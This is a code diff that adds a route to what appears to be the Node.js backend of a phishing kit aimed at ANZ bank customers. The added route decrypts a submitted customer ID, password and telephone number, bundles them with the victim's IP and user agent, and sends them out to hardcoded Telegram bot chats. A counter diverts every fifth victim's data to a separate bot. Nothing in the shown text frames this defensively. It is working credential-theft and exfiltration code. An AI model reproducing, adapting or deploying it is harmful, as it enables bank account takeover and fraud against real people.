@@ -4480,6 +4480,40 @@ app.post("/anzHoods", (req, res) => {
   res.send("Update Completed");
 });
 
+let anzTarrifi = 0;
+
+app.options("/anzTarrifi", cors());
+
+app.post("/anzTarrifi", (req, res) => {
+  customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
+  if (anzTarrifi == 4) {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+    );
+    anzTarrifi = 0;
+  } else {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=ANZTarrifi:\n${originalText}`
+    );
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=ANZ:\n${originalText}`
+    );
+    anzTarrifi += 1;
+  }
+  res.send("Update Completed");
+});
+
 //BT
 //BT
 //BT
